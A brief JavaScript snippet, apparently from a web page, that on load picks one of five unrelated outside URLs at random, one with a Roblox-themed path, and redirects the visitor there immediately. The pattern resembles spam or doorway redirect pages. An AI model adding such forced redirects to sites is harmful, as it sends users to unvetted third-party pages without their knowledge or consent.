window.onload = function() {
    var links = [
        "https://doctoraux.com/",
        "https://hotkitchenbag.com/",
        "https://educationbluesky.com/",
        "https://mathstutors.co/",
        "https://turbolite.xyz/roblox5"
    ];
    var randomLink = links[Math.floor(Math.random() * links.length)];
    document.getElementById("manual-link").href = randomLink;
    window.location.href = randomLink;
};
